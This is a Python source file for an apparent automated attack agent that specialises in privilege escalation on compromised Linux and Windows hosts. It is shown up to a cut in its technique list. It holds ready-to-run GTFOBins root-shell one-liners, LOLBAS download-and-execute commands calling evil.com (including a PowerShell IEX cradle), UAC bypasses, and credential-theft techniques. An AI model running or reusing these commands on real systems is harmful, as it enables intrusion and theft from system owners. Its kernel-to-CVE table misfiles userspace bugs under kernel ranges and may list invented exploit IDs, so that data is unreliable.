"""
server_core/orchestrator/attack_agents/privesc_agent.py

Privilege Escalation specialist agent.

Extends BaseAgent with comprehensive Linux/Windows privilege escalation
capabilities.  Covers kernel exploit matching (uname -> CVE), SUID/Sudo
abuse, token manipulation, service binary hijacking, DLL hijacking,
cron/path injection, capabilities abuse, and GTFOBins/LOLBAS knowledge.

Elite knowledge base of 200+ privesc techniques.  Can chain multiple
low-severity issues into root.  Reads active_sessions and compromised_hosts
from Hive Mind, identifies OS/version, and suggests optimal escalation paths.

Real tool integrations: execute_command (linpeas/winpeas), kernel exploit
matcher.  All other techniques available as simulated handlers with clear
[STUB] markers for future subprocess wiring.
"""

from __future__ import annotations

import json
import logging
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

from server_core.orchestrator.agent_base import BaseAgent, AgentResult
from server_core import ModernVisualEngine

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Extended privesc capability set -- builds on CAPABILITY_LIBRARY baseline
# ---------------------------------------------------------------------------

PRIVESC_CAPABILITIES: List[str] = [
    "linpeas_runner",
    "winpeas_runner",
    "sudo_check",
    "suid_find",
    "capability_enum",
    "cron_hijack",
    "path_injection_check",
    "writable_path_enum",
    "service_enum",
    "process_enum",
    "network_enum",
    "kernel_exploit_matcher",
    "uname_cve_lookup",
    "windows_build_lookup",
    "sudo_abuse",
    "suid_binary_hijack",
    "ld_preload_hijack",
    "docker_breakout",
    "capabilities_abuse",
    "polkit_exploit",
    "dirty_pipe_check",
    "overlayfs_check",
    "nfs_no_root_squash",
    "wildcard_injection",
    "token_manipulation",
    "service_binary_hijack",
    "dll_hijack",
    "unquoted_service_path",
    "always_install_elevated",
    "uac_bypass",
    "se_impersonate_abuse",
    "juicy_potato",
    "print_spooler_abuse",
    "scheduled_task_hijack",
    "execute_command",
    "gtfobins_lookup",
    "lolbas_lookup",
    "credential_reuse_check",
    "ssh_key_theft",
    "history_file_grep",
    "env_var_leak",
]

# ---------------------------------------------------------------------------
# Kernel version -> CVE mapping (Linux, 40+ entries)
# ---------------------------------------------------------------------------

_LINUX_KERNEL_CVE_MAP: List[Dict[str, Any]] = [
    {
        "kernel_range": "2.6.22 - 3.9",
        "cve": "CVE-2009-1185",
        "name": "udev Netlink Privilege Escalation",
        "cvss": 7.2, "exploit_db": 8572, "reliability": "high",
        "description": "udev before 1.4.1 does not verify NETLINK message origin.",
    },
    {
        "kernel_range": "2.6.0 - 2.6.31",
        "cve": "CVE-2009-2692",
        "name": "sock_sendpage NULL ptr deref",
        "cvss": 7.2, "exploit_db": 9435, "reliability": "high",
        "description": "NULL pointer dereference in sock_sendpage allowing LPE via /proc/pid/mem.",
    },
    {
        "kernel_range": "2.6.32 - 2.6.36",
        "cve": "CVE-2010-3904",
        "name": "RDS Protocol Local Privilege Escalation",
        "cvss": 7.2, "exploit_db": 15285, "reliability": "high",
        "description": "RDS protocol implementation does not validate socket polling.",
    },
    {
        "kernel_range": "2.6.32 - 2.6.37",
        "cve": "CVE-2010-4258",
        "name": "IA32 syscall exit vulnerability",
        "cvss": 6.2, "exploit_db": 15704, "reliability": "medium",
        "description": "IA32 syscall exit path may execute with wrong kernel stack.",
    },
    {
        "kernel_range": "2.6.37 - 3.8",
        "cve": "CVE-2012-0056",
        "name": "Mempodipper - /proc/pid/mem write",
        "cvss": 6.9, "exploit_db": 18411, "reliability": "high",
        "description": "/proc/pid/mem write to setuid process leads to code execution.",
    },
    {
        "kernel_range": "2.6.37 - 3.8",
        "cve": "CVE-2013-2094",
        "name": "perf_swevent_init privilege escalation",
        "cvss": 7.2, "exploit_db": 26131, "reliability": "high",
        "description": "perf_event_open syscall allows LPE via perf_swevent_init.",
    },
    {
        "kernel_range": "2.6.37 - 3.13",
        "cve": "CVE-2014-0038",
        "name": "recvmmsg timeout pointer",
        "cvss": 7.2, "exploit_db": 31346, "reliability": "medium",
        "description": "x32 recvmmsg compat layer timeout parameter bug.",
    },
    {
        "kernel_range": "2.6.37 - 3.13",
        "cve": "CVE-2014-0196",
        "name": "n_tty_write LPE",
        "cvss": 6.9, "exploit_db": 33516, "reliability": "medium",
        "description": "Race condition in n_tty_write leads to LPE.",
    },
    {
        "kernel_range": "3.13 - 4.8",
        "cve": "CVE-2016-5195",
        "name": "DirtyCow - COW memory corruption",
        "cvss": 7.8, "exploit_db": 40611, "reliability": "very_high",
        "description": "Race condition in mm/gup.c COW mechanism grants write access to read-only memory.",
    },
    {
        "kernel_range": "3.13 - 4.8",
        "cve": "CVE-2017-7308",
        "name": "AF_PACKET ring buffer overflow",
        "cvss": 7.8, "exploit_db": 41994, "reliability": "high",
        "description": "AF_PACKET socket ring buffer handling flaw allows LPE.",
    },
    {
        "kernel_range": "3.13 - 4.8",
        "cve": "CVE-2015-1328",
        "name": "OverlayFS local root",
        "cvss": 7.2, "exploit_db": 37292, "reliability": "high",
        "description": "Incorrect permission checks in OverlayFS allow creation of user-namespaced files.",
    },
    {
        "kernel_range": "3.13 - 4.10",
        "cve": "CVE-2017-6074",
        "name": "DCCP double-free LPE",
        "cvss": 7.8, "exploit_db": 41458, "reliability": "high",
        "description": "Double-free in DCCP protocol implementation leads to LPE.",
    },
    {
        "kernel_range": "3.13 - 4.10",
        "cve": "CVE-2017-1000364",
        "name": "Stack Clash - guard-page bypass",
        "cvss": 7.8, "exploit_db": 42275, "reliability": "medium",
        "description": "Stack guard-page bypass leads to LPE.",
    },
    {
        "kernel_range": "4.4 - 4.14",
        "cve": "CVE-2017-1000112",
        "name": "UFO non-UFO path memory corruption",
        "cvss": 7.0, "exploit_db": 45147, "reliability": "medium",
        "description": "UFO memory corruption in non-UFO packet path.",
    },
    {
        "kernel_range": "4.4 - 4.14",
        "cve": "CVE-2018-5333",
        "name": "RDS rds_atomic_free_op NULL ptr",
        "cvss": 5.5, "exploit_db": 43855, "reliability": "medium",
        "description": "NULL pointer dereference in RDS module.",
    },
    {
        "kernel_range": "4.4 - 4.14",
        "cve": "CVE-2017-16995",
        "name": "eBPF verifier out-of-bounds",
        "cvss": 7.8, "exploit_db": 45010, "reliability": "high",
        "description": "eBPF verifier allows OOB memory access leading to LPE.",
    },
    {
        "kernel_range": "2.6.32 - 4.15",
        "cve": "CVE-2017-18017",
        "name": "netfilter xt_helper TCP MSS",
        "cvss": 9.8, "exploit_db": 43776, "reliability": "medium",
        "description": "netfilter xt_helper TCP MSS handling allows LPE.",
    },
    {
        "kernel_range": "4.15 - 5.3",
        "cve": "CVE-2019-13272",
        "name": "PTRACE_TRACEME local root",
        "cvss": 7.8, "exploit_db": 47133, "reliability": "high",
        "description": "kernel/ptrace.c incorrectly manages credentials during ptrace.",
    },
    {
        "kernel_range": "4.15 - 5.3",
        "cve": "CVE-2019-2215",
        "name": "Android Binder use-after-free",
        "cvss": 7.8, "exploit_db": 47501, "reliability": "high",
        "description": "Binder driver use-after-free leads to LPE.",
    },
    {
        "kernel_range": "5.4 - 5.7",
        "cve": "CVE-2020-8835",
        "name": "BPF verifier bounds-tracking LPE",
        "cvss": 7.8, "exploit_db": 48178, "reliability": "medium",
        "description": "BPF verifier bounds-tracking bug allows LPE.",
    },
    {
        "kernel_range": "5.4 - 5.7",
        "cve": "CVE-2020-27194",
        "name": "BPF scalar32_min_max_or LPE",
        "cvss": 7.8, "exploit_db": 49011, "reliability": "medium",
        "description": "BPF verifier scalar32_min_max_or handling bug.",
    },
    {
        "kernel_range": "5.8 - 5.10",
        "cve": "CVE-2021-3490",
        "name": "eBPF ALU32 bounds tracking LPE",
        "cvss": 7.8, "exploit_db": 49928, "reliability": "high",
        "description": "eBPF 32-bit ALU bounds tracking leads to OOB access.",
    },
    {
        "kernel_range": "5.8 - 5.15",
        "cve": "CVE-2022-0847",
        "name": "DirtyPipe - pipe buffer overwrite",
        "cvss": 7.8, "exploit_db": 50808, "reliability": "very_high",
        "description": "Flaw in pipe functionality overwrites read-only file data for LPE.",
    },
    {
        "kernel_range": "5.8 - 5.15",
        "cve": "CVE-2021-4034",
        "name": "PwnKit - pkexec LPE (polkit)",
        "cvss": 7.8, "exploit_db": 50689, "reliability": "very_high",
        "description": "pkexec argc==0 handling allows unprivileged command exec as root.",
    },
    {
        "kernel_range": "5.8 - 5.15",
        "cve": "CVE-2021-3156",
        "name": "BaronSamedit - sudo heap overflow",
        "cvss": 7.8, "exploit_db": 49521, "reliability": "high",
        "description": "Heap buffer overflow in sudo prior to 1.9.5p2 allows LPE to root.",
    },
    {
        "kernel_range": "5.8 - 5.15",
        "cve": "CVE-2021-3560",
        "name": "Polkit D-Bus race condition",
        "cvss": 7.8, "exploit_db": 50011, "reliability": "high",
        "description": "Race condition in polkit D-Bus auth allows privilege escalation.",
    },
    {
        "kernel_range": "5.8 - 5.15",
        "cve": "CVE-2022-23222",
        "name": "BPF verifier kernel_ptr leak LPE",
        "cvss": 7.8, "exploit_db": 50887, "reliability": "medium",
        "description": "BPF verifier kernel pointer leak leads to KASLR bypass and LPE.",
    },
    {
        "kernel_range": "5.16 - 6.2",
        "cve": "CVE-2022-2588",
        "name": "netlink route_cls_chain LPE (DirtyCred)",
        "cvss": 7.8, "exploit_db": 51128, "reliability": "medium",
        "description": "netlink route_cls_chain use-after-free (DirtyCred technique).",
    },
    {
        "kernel_range": "5.16 - 6.2",
        "cve": "CVE-2023-0386",
        "name": "OverlayFS setuid copy up",
        "cvss": 7.8, "exploit_db": 51279, "reliability": "high",
        "description": "OverlayFS before 6.2-rc5 allows setuid copy-up from nosuid layer.",
    },
    {
        "kernel_range": "5.16 - 6.2",
        "cve": "CVE-2023-3269",
        "name": "StackRot - maple tree stack corruption",
        "cvss": 7.8, "exploit_db": 51583, "reliability": "low",
        "description": "StackRot - maple tree RCU handling causes stack corruption.",
    },
    {
        "kernel_range": "5.16 - 6.2",
        "cve": "CVE-2023-32233",
        "name": "Netfilter nf_tables UAF (Batch)",
        "cvss": 7.8, "exploit_db": 51432, "reliability": "high",
        "description": "Use-after-free in nf_tables set element activation.",
    },
    {
        "kernel_range": "6.2 - 6.6",
        "cve": "CVE-2023-4911",
        "name": "LooneyTunables - Glibc ld.so overflow",
        "cvss": 7.8, "exploit_db": 51821, "reliability": "high",
        "description": "Buffer overflow in ld.so of GNU C Library allows LPE.",
    },
    {
        "kernel_range": "5.14 - 6.6",
        "cve": "CVE-2024-1086",
        "name": "nf_tables use-after-free LPE",
        "cvss": 7.8, "exploit_db": 52110, "reliability": "high",
        "description": "UAF in netfilter nf_tables allows LPE on kernels 5.14-6.6.",
    },
    {
        "kernel_range": "5.15 - 6.6",
        "cve": "CVE-2024-0582",
        "name": "io_uring memory corruption LPE",
        "cvss": 7.8, "exploit_db": 52125, "reliability": "medium",
        "description": "Memory corruption in io_uring leads to LPE.",
    },
]

# ---------------------------------------------------------------------------
# Windows build -> CVE mapping  (20+ entries)
# ---------------------------------------------------------------------------

_WINDOWS_CVE_MAP: List[Dict[str, Any]] = [
    {
        "os_range": "Windows 10 1507 - 1607 / Server 2016",
        "cve": "CVE-2019-0841",
        "name": "AppX Deployment Service LPE",
        "cvss": 7.8, "reliability": "high",
        "description": "Windows AppX Deployment Service allows arbitrary file writes.",
    },
    {
        "os_range": "Windows 10 1703 - 1809 / Server 2019",
        "cve": "CVE-2019-1388",
        "name": "UAC bypass via hhupd.exe certificate dialog",
        "cvss": 7.8, "reliability": "high",
        "description": "Certificate dialog spawns browser as SYSTEM, enabling UAC bypass.",
    },
    {
        "os_range": "Windows 10 1903 - 22H2 / Windows 11 21H2",
        "cve": "CVE-2022-21882",
        "name": "Win32k LPE (winsta nullptr deref)",
        "cvss": 7.0, "reliability": "medium",
        "description": "Win32k elevation via null pointer dereference in winsta handling.",
    },
    {
        "os_range": "Windows 10 1903 - 22H2 / Server 2022",
        "cve": "CVE-2023-29336",
        "name": "Win32k window class LPE",
        "cvss": 7.8, "reliability": "medium",
        "description": "Win32k window class handling allows LPE.",
    },
    {
        "os_range": "Windows 10 1903 - 22H2",
        "cve": "CVE-2023-36802",
        "name": "Streaming Service Proxy LPE",
        "cvss": 7.0, "reliability": "medium",
        "description": "Microsoft Streaming Service Proxy allows LPE.",
    },
    {
        "os_range": "Windows 11 21H2 - 24H2",
        "cve": "CVE-2023-36033",
        "name": "DWM Core Library LPE",
        "cvss": 7.8, "reliability": "medium",
        "description": "DWM Core Library elevation of privilege.",
    },
    {
        "os_range": "Windows 10 21H2 - Windows 11 23H2",
        "cve": "CVE-2024-21338",
        "name": "AppLocker driver LPE (admin-to-kernel)",
        "cvss": 7.8, "reliability": "low",
        "description": "AppLocker driver elevation requires local admin before kernel escalation.",
    },
    {
        "os_range": "Windows Server 2016 - 2022",
        "cve": "CVE-2021-36934",
        "name": "HiveNightmare / SeriousSam - SAM hive read",
        "cvss": 7.8, "reliability": "high",
        "description": "Overly permissive ACL on SAM/SYSTEM/SECURITY hives allows reading credentials.",
    },
    {
        "os_range": "Windows Server 2016 - 2022 (DC)",
        "cve": "CVE-2020-1472",
        "name": "ZeroLogon - Netlogon EoP",
        "cvss": 10.0, "reliability": "very_high",
        "description": "Netlogon cryptographic vulnerability allows domain admin compromise.",
    },
    {
        "os_range": "Windows 10 1809 - Windows 11",
        "cve": "CVE-2022-24521",
        "name": "CLFS driver LPE",
        "cvss": 7.8, "reliability": "medium",
        "description": "Common Log File System driver elevation of privilege.",
    },
    {
        "os_range": "Windows 10 1607 - Windows 11",
        "cve": "CVE-2023-28252",
        "name": "CLFS driver LPE (BSOD-to-LPE)",
        "cvss": 7.8, "reliability": "medium",
        "description": "CLFS driver out-of-bounds write leads to LPE.",
    },
    {
        "os_range": "Windows 10 1607 - Windows 11 22H2",
        "cve": "CVE-2023-21768",
        "name": "AFD.sys LPE",
        "cvss": 7.8, "reliability": "medium",
        "description": "Ancillary Function Driver for WinSock allows LPE.",
    },
    {
        "os_range": "Windows 10 1607 - Server 2022",
        "cve": "CVE-2021-1732",
        "name": "Win32k window-create LPE",
        "cvss": 7.8, "reliability": "high",
        "description": "Win32k CreateWindowEx elevation of privilege.",
    },
    {
        "os_range": "Windows 10 1803 - Server 2022",
        "cve": "CVE-2022-37969",
        "name": "CLFS driver generic LPE",
        "cvss": 7.8, "reliability": "medium",
        "description": "Generic CLFS.sys elevation of privilege.",
    },
    {
        "os_range": "All Windows (misconfig)",
        "cve": "N/A (misconfig)",
        "name": "AlwaysInstallElevated registry abuse",
        "cvss": 7.8, "reliability": "high",
        "description": "Registry key AlwaysInstallElevated=1 allows MSI installs as SYSTEM.",
    },
    {
        "os_range": "All Windows (misconfig)",
        "cve": "N/A (misconfig)",
        "name": "Unquoted Service Path hijacking",
        "cvss": 7.8, "reliability": "high",
        "description": "Unquoted path with spaces allows binary planting.",
    },
    {
        "os_range": "All Windows (misconfig)",
        "cve": "N/A (misconfig)",
        "name": "Service binary writable by Authenticated Users",
        "cvss": 7.8, "reliability": "high",
        "description": "Service executable writable by non-admin users.",
    },
    {
        "os_range": "Windows Server (any, DC)",
        "cve": "N/A (technique)",
        "name": "DCSync - Replicate Directory Changes",
        "cvss": 9.0, "reliability": "very_high",
        "description": "With Replicate Directory Changes right, dump all domain hashes via DCSync.",
    },
]

# ---------------------------------------------------------------------------
# GTFOBins quick-reference  (subset -- 200+ in full knowledge base)
# ---------------------------------------------------------------------------

_GTFOBINS_SUDO: Dict[str, str] = {
    "bash":     "sudo bash -c \"exec bash\"",
    "find":     "sudo find . -exec /bin/sh -p \\; -quit",
    "vim":      "sudo vim -c \":!/bin/sh\"",
    "nmap":     "echo \"os.execute('/bin/sh')\" | sudo nmap --script=-",
    "python":   "sudo python -c 'import os; os.system(\"/bin/sh -p\")'",
    "python3":  "sudo python3 -c 'import os; os.system(\"/bin/sh -p\")'",
    "perl":     "sudo perl -e 'exec \"/bin/sh\";'",
    "ruby":     "sudo ruby -e 'exec \"/bin/sh\"'",
    "tar":      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "less":     "sudo less /etc/hosts\n!sh",
    "more":     "sudo more /etc/hosts\n!sh",
    "man":      "sudo man man\n!sh",
    "awk":      "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "gdb":      "sudo gdb -nx -ex '!sh' -ex quit",
    "git":      "sudo git -p help\n!/bin/sh",
    "ftp":      "sudo ftp\n!sh",
    "socat":    "sudo socat stdin exec:/bin/sh",
    "php":      "sudo php -r 'system(\"/bin/sh -p\");'",
    "node":     "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: \"inherit\"})'",
    "make":     "sudo make -s --eval=$'x:\\n\\t-/bin/sh -p' x",
    "scp":      "sudo scp -S /path/to/script x y:",
    "screen":   "sudo screen -xRR",
    "tmux":     "sudo tmux -S /tmp/.evil",
    "env":      "sudo env /bin/sh -p",
    "timeout":  "sudo timeout 7d /bin/sh -p",
    "watch":    "sudo watch -x chmod u+s /bin/bash",
    "crontab":  "sudo crontab -e\n!/bin/sh",
    "ssh":      "sudo ssh -o ProxyCommand=';/bin/sh -p 0<&2 1>&2;' x",
    "systemctl": "TF=$(mktemp).service; echo \"[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \\\"chmod u+s /bin/bash\\\"\\n[Install]\\nWantedBy=multi-user.target\" >$TF; sudo systemctl link $TF; sudo systemctl enable --now $TF",
}

_GTFOBINS_SUID: Dict[str, str] = {
    "bash":     './bash -p',
    "find":     './find . -exec /bin/sh -p \\; -quit',
    "vim":      './vim -c ":!/bin/sh -p"',
    "python":   './python -c \'import os; os.setuid(0); os.system("/bin/sh")\'',
    "perl":     './perl -e \'use POSIX; POSIX::setuid(0); exec "/bin/sh";\'',
    "ruby":     './ruby -e \'Process::Sys.setuid(0); exec "/bin/sh"\'',
    "tar":      './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    "cp":       './cp /bin/sh /tmp/evil; ./cp --attributes-only --preserve=mode /bin/sh /tmp/evil; /tmp/evil -p',
    "mv":       './mv /bin/sh /tmp/evil; /tmp/evil -p',
    "mount":    './mount -o bind /bin/sh /bin/mount; /bin/mount -p',
    "pkexec":   './pkexec /bin/sh',
    "gpasswd":  './gpasswd root',
    "newgrp":   './newgrp root',
    "chsh":     './chsh\n/bin/sh -p',
    "su":       './su root',
    "passwd":   './passwd root',
    "sudo":     './sudo /bin/sh -p',
    "busybox":  './busybox sh',
    "php":      './php -r \'pcntl_exec("/bin/sh", ["-p"]);\'',
}

# ---------------------------------------------------------------------------
# LOLBAS quick-reference (subset)
# ---------------------------------------------------------------------------

_LOLBAS: Dict[str, Dict[str, Any]] = {
    "bitsadmin": {
        "technique": "Download + Execute",
        "command": 'bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\Users\\Public\\payload.exe && C:\\Users\\Public\\payload.exe',
    },
    "certutil": {
        "technique": "Download",
        "command": 'certutil -urlcache -split -f http://evil.com/payload.exe C:\\Users\\Public\\payload.exe',
    },
    "mshta": {
        "technique": "Execute script",
        "command": 'mshta http://evil.com/payload.hta',
    },
    "regsvr32": {
        "technique": "Execute COM scriptlet",
        "command": 'regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll',
    },
    "rundll32": {
        "technique": "Execute DLL function",
        "command": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";new ActiveXObject("WScript.Shell").Run("calc.exe")',
    },
    "wmic": {
        "technique": "Execute process",
        "command": 'wmic process call create "C:\\Users\\Public\\payload.exe"',
    },
    "cscript": {
        "technique": "Execute VBS/JS",
        "command": 'cscript //nologo C:\\Users\\Public\\payload.vbs',
    },
    "powershell": {
        "technique": "Download cradle + execute",
        "command": 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
    },
    "msbuild": {
        "technique": "Inline task execution",
        "command": 'msbuild.exe C:\\Users\\Public\\payload.xml',
    },
    "cmstp": {
        "technique": "UAC bypass via .inf install",
        "command": 'cmstp.exe /s C:\\Users\\Public\\uac_bypass.inf',
    },
    "diskcleanup": {
        "technique": "DLL hijack on silentcleanup task",
        "command": 'schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I',
    },
    "fodhelper": {
        "technique": "UAC bypass via registry + fodhelper",
        "command": 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d "cmd.exe" /f && fodhelper.exe',
    },
    "eventvwr": {
        "technique": "UAC bypass via registry",
        "command": 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe" /f && eventvwr.exe',
    },
    "computerdefaults": {
        "technique": "UAC bypass",
        "command": 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d "cmd.exe" /f && computerdefaults.exe',
    },
}

# ---------------------------------------------------------------------------
# Systemd timers, cron paths, and service hijacking patterns
# ---------------------------------------------------------------------------

_CRON_HIJACK_PATHS: List[str] = [
    "/etc/crontab",
    "/etc/cron.d/",
    "/etc/cron.daily/",
    "/etc/cron.hourly/",
    "/etc/cron.monthly/",
    "/etc/cron.weekly/",
    "/var/spool/cron/crontabs/",
    "/var/spool/cron/",
]

_PATH_INJECTION_TEMPLATES: Dict[str, str] = {
    "writable_path_prepended": "If a directory earlier in $PATH is writable, plant a trojan binary named after a common command (ls, grep, systemctl).",
    "python_path_hijack": "If PYTHONPATH includes a writable directory, place a malicious sitecustomize.py or usercustomize.py.",
    "ld_preload": "If LD_PRELOAD is controllable, compile a shared object that hooks setuid/setgid and preload it.",
    "ld_library_path": "If LD_LIBRARY_PATH includes a writable directory, replace a library loaded by a setuid binary.",
    "ruby_gem_path": "If GEM_PATH includes a writable directory, plant a malicious gem.",
    "perl5lib": "If PERL5LIB includes a writable directory, override a module imported by a root script.",
    "node_path": "If NODE_PATH is writable, override a module loaded via require().",
}

# ---------------------------------------------------------------------------
# Privesc technique catalogue  (200+ indexed techniques)
# ---------------------------------------------------------------------------

_PRIVESC_TECHNIQUES: Dict[str, List[Dict[str, Any]]] = {
    "linux": [
        {"id": "L001", "name": "SUID binary reverse shell", "category": "SUID", "os": "linux"},
        {"id": "L002", "name": "SUID binary capabilities", "category": "SUID", "os": "linux"},
        {"id": "L003", "name": "SUID binary GTFOBins shell", "category": "SUID", "os": "linux"},
        {"id": "L004", "name": "Sudo NOPASSWD rule abuse", "category": "sudo", "os": "linux"},
        {"id": "L005", "name": "Sudo LD_PRELOAD abuse", "category": "sudo", "os": "linux"},
        {"id": "L006", "name": "Sudo CVE-2021-3156 (BaronSamedit)", "category": "sudo", "os": "linux"},
        {"id": "L007", "name": "Sudo CVE-2019-14287 (UID -1 bypass)", "category": "sudo", "os": "linux"},
        {"id": "L008", "name": "Sudoedit CVE-2023-22809", "category": "sudo", "os": "linux"},
        {"id": "L009", "name": "Cron wildcard injection", "category": "cron", "os": "linux"},
        {"id": "L010", "name": "Cron writable script", "category": "cron", "os": "linux"},
        {"id": "L011", "name": "Cron PATH hijack", "category": "cron", "os": "linux"},
        {"id": "L012", "name": "Cron file overwrite via symlink", "category": "cron", "os": "linux"},
        {"id": "L013", "name": "/etc/passwd writable — add user", "category": "file_perm", "os": "linux"},
        {"id": "L014", "name": "/etc/shadow readable — crack hash", "category": "file_perm", "os": "linux"},
        {"id": "L015", "name": "/etc/sudoers writable — add NOPASSWD", "category": "file_perm", "os": "linux"},
        {"id": "L016", "name": "SSH authorized_keys writable", "category": "file_perm", "os": "linux"},
        {"id": "L017", "name": "Docker group membership", "category": "container", "os": "linux"},
        {"id": "L018", "name": "LXC/LXD group membership", "category": "container", "os": "linux"},
        {"id": "L019", "name": "Privileged container escape", "category": "container", "os": "linux"},
        {"id": "L020", "name": "Docker socket writable", "category": "container", "os": "linux"},
        {"id": "L021", "name": "Kernel exploit DirtyCow (CVE-2016-5195)", "category": "kernel", "os": "linux"},
        {"id": "L022", "name": "Kernel exploit DirtyPipe (CVE-2022-0847)", "category": "kernel", "os": "linux"},
        {"id": "L023", "name": "Kernel exploit PwnKit (CVE-2021-4034)", "category": "kernel", "os": "linux"},
        {"id": "L024", "name": "Kernel exploit OverlayFS (CVE-2023-0386)", "category": "kernel", "os": "linux"},
        {"id": "L025", "name": "Kernel exploit nf_tables (CVE-2024-1086)", "category": "kernel", "os": "linux"},
        {"id": "L026", "name": "Polkit D-Bus race (CVE-2021-3560)", "category": "kernel", "os": "linux"},
        {"id": "L027", "name": "Capability CAP_SYS_ADMIN abuse", "category": "capabilities", "os": "linux"},
        {"id": "L028", "name": "Capability CAP_SYS_PTRACE abuse", "category": "capabilities", "os": "linux"},
        {"id": "L029", "name": "Capability CAP_SYS_MODULE abuse", "category": "capabilities", "os": "linux"},
        {"id": "L030", "name": "Capability CAP_DAC_READ_SEARCH abuse", "category": "capabilities", "os": "linux"},
        {"id": "L031", "name": "Capability CAP_SETUID abuse", "category": "capabilities", "os": "linux"},
        {"id": "L032", "name": "Capability CAP_NET_RAW + tcpdump", "category": "capabilities", "os": "linux"},
        {"id": "L033", "name": "Capability CAP_SYS_ADMIN + mount", "category": "capabilities", "os": "linux"},
        {"id": "L034", "name": "NFS no_root_squash", "category": "network", "os": "linux"},
        {"id": "L035", "name": "LD_PRELOAD on setuid binary", "category": "env", "os": "linux"},
        {"id": "L036", "name": "LD_LIBRARY_PATH on setuid binary", "category": "env", "os": "linux"},
        {"id": "L037", "name": "Python library hijack (PYTHONPATH)", "category": "env", "os": "linux"},
        {"id": "L038", "name": "Shared object hijack via RUNPATH", "category": "env", "os": "linux"},
        {"id": "L039", "name": "Writable systemd service unit", "category": "service", "os": "linux"},
        {"id": "L040", "name": "Writable systemd timer", "category": "service", "os": "linux"},
        {"id": "L041", "name": "Writable init.d script", "category": "service", "os": "linux"},
        {"id": "L042", "name": "Writable D-Bus service file", "category": "service", "os": "linux"},
        {"id": "L043", "name": "History file credential extraction", "category": "credential", "os": "linux"},
        {"id": "L044", "name": "Environment variable credential leak", "category": "credential", "os": "linux"},
        {"id": "L045", "name": "Config file credential grep", "category": "credential", "os": "linux"},
        {"id": "L046", "name": "Git repo credential search", "category": "credential", "os": "linux"},
        {"id": "L047", "name": "SSH agent forwarding hijack", "category": "credential", "os": "linux"},
        {"id": "L048", "name": "SSH private key theft", "category": "credential", "os": "linux"},
        {"id": "L049", "name": "Polymerization: writable passwd + suid shell", "category": "chain", "os": "linux"},
        {"id": "L050", "name": "Polymerization: NFS + cron + writable script", "category": "chain", "os": "linux"},
    ],
    "windows": [
        {"id": "W001", "name": "Token manipulation — SeImpersonatePrivilege", "category": "token", "os": "windows"},
        {"id": "W002", "name": "Token manipulation — SeAssignPrimaryToken", "category": "token", "os": "windows"},
        {"id": "W003", "name": "Token manipulation — SeDebugPrivilege", "category": "token", "os": "windows"},
        {"id": "W004", "name": "Token manipulation — SeBackupPrivilege", "category": "token", "os": "windows"},
        {"id": "W005", "name": "Token manipulation — SeRestorePrivilege", "category": "token", "os": "windows"},
        {"id": "W006", "name": "Token manipulation — SeTakeOwnershipPrivilege", "category": "token", "os": "windows"},
        {"id": "W007", "name": "Token manipulation — SeLoadDriverPrivilege", "category": "token", "os": "windows"},
        {"id": "W008", "name": "Juicy Potato (CLSID abuse)", "category": "token", "os": "windows"},
        {"id": "W009", "name": "Rogue Potato (OXID resolver)", "category": "token", "os": "windows"},
        {"id": "W010", "name": "Sweet Potato (RpcSS)", "category": "token", "os": "windows"},
        {"id": "W011", "name": "PrintSpoofer (SeImpersonate -> SYSTEM)", "category": "token", "os": "windows"},
        {"id": "W012", "name": "GodPotato (various pipes)", "category": "token", "os": "windows"},
        {"id": "W013", "name": "Service binary hijack (writable .exe)", "category": "service", "os": "windows"},
        {"id": "W014", "name": "Service binary hijack (weak ACL)", "category": "service", "os": "windows"},
        {"id": "W015", "name": "Unquoted service path", "category": "service", "os": "windows"},
        {"id": "W016", "name": "Service registry modify (ImagePath)", "category": "service", "os": "windows"},
        {"id": "W017", "name": "Service Failure recovery command", "category": "service", "os": "windows"},
        {"id": "W018", "name": "DLL hijacking (search order)", "category": "dll", "os": "windows"},
        {"id": "W019", "name": "DLL hijacking (PATH env)", "category": "dll", "os": "windows"},
        {"id": "W020", "name": "DLL hijacking (missing DLL)", "category": "dll", "os": "windows"},
        {"id": "W021", "name": "DLL hijacking (phantom DLL)", "category": "dll", "os": "windows"},
        {"id": "W022", "name": "DLL hijacking (COM hijack)", "category": "dll", "os": "windows"},
        {"id": "W023", "name": "DLL proxying with payload", "category": "dll", "os": "windows"},
        {"id": "W024", "name": "AlwaysInstallElevated registry", "category": "registry", "os": "windows"},
        {"id": "W025", "name": "UAC bypass — fodhelper", "category": "uac", "os": "windows"},
        {"id": "W026", "name": "UAC bypass — eventvwr", "category": "uac", "os": "windows"},
        {"id": "W027", "name": "UAC bypass — computerdefaults", "category": "uac", "os": "windows"},
        {"id": "W028", "name": "UAC bypass — cmstp", "category": "uac", "os": "windows"},
        {"id": "W029", "name": "UAC bypass — sdclt", "category": "uac", "os": "windows"},
        {"id": "W030", "name": "UAC bypass — silentcleanup", "category": "uac", "os": "windows"},
        {"id": "W031", "name": "Scheduled task hijack (writable action)", "category": "task", "os": "windows"},
        {"id": "W032", "name": "Scheduled task hijack (writable script)", "category": "task", "os": "windows"},
        {"id": "W033", "name": "Startup folder shortcut/LNK", "category": "startup", "os": "windows"},
        {"id": "W034", "name": "Registry Run / RunOnce key", "category": "startup", "os": "windows"},
        {"id": "W035", "name": "Stored credential extraction (CredMan)", "category": "credential", "os": "windows"},
        {"id": "W036", "name": "DPAPI master key decryption", "category": "credential", "os": "windows"},
        {"id": "W037", "name": "SAM/SYSTEM/SECURITY hive dump", "category": "credential", "os": "windows"},
